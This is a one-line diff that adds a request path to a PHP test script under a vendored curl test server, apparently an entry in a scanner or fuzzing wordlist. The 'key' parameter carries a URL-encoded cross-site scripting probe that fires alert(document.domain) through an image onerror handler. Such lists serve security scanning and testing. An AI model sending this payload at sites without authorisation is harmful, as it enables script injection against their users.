@@ -1,0 +1,1 @@
+/vendor/curl/curl/tests/server/php-curl-test/post_file_path_upload.php?key=<img%20src%20onerror%3dalert(document.domain)>
